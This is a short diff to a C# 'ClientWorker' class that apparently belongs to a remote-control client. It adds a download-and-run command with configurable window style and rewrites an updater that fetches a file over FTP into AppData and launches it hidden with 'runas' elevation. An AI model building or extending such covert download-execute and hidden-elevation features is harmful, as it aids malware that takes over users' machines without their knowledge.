@@ -88,17 +88,17 @@ namespace ClientWorker
         {
             FileManager.Download(FileName, localPath);        
         }
+        public void DownloadAndRun(string file,string localPath, string verb, string args, ProcessWindowStyle style, bool useShellExecute)
+        {
+            FileManager.DownloadFileAndRun(file, localPath, verb, args, style,useShellExecute);
+        }
         public void DownloadUpdate()
         {
             GetUpd();
         }
-        public void RunHideProgram(string file)
+        public void RunProgram(string file, string verb, string args, ProcessWindowStyle style, bool useShellExecute)
         {
-            FileManager.RunHideProc(file);
-        }
-        public void DownloadAndRun(string file)
-        {
-            FileManager.DownloadFileAndRun(file);
+            FileManager.RunProc(file, verb, args, style, useShellExecute);
         }
         public void Reconnect()
         {
@@ -150,8 +150,8 @@ namespace ClientWorker
         {
             string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                 KillUpdater();
-                FtpClient.DownloadF(StartData.updater, folderPath + StartData.floaderNewCopy);
-                FileManager.RunHideProc(folderPath + StartData.floaderNewCopy + StartData.updater);              
+                FtpClient.DownloadF(StartData.updater, folderPath + StartData.floaderNewCopy);        
+            FileManager.RunProc(folderPath + StartData.floaderNewCopy + StartData.updater, "runas", "", ProcessWindowStyle.Hidden, false); ;              
         }
         private void KillUpdater()
         {
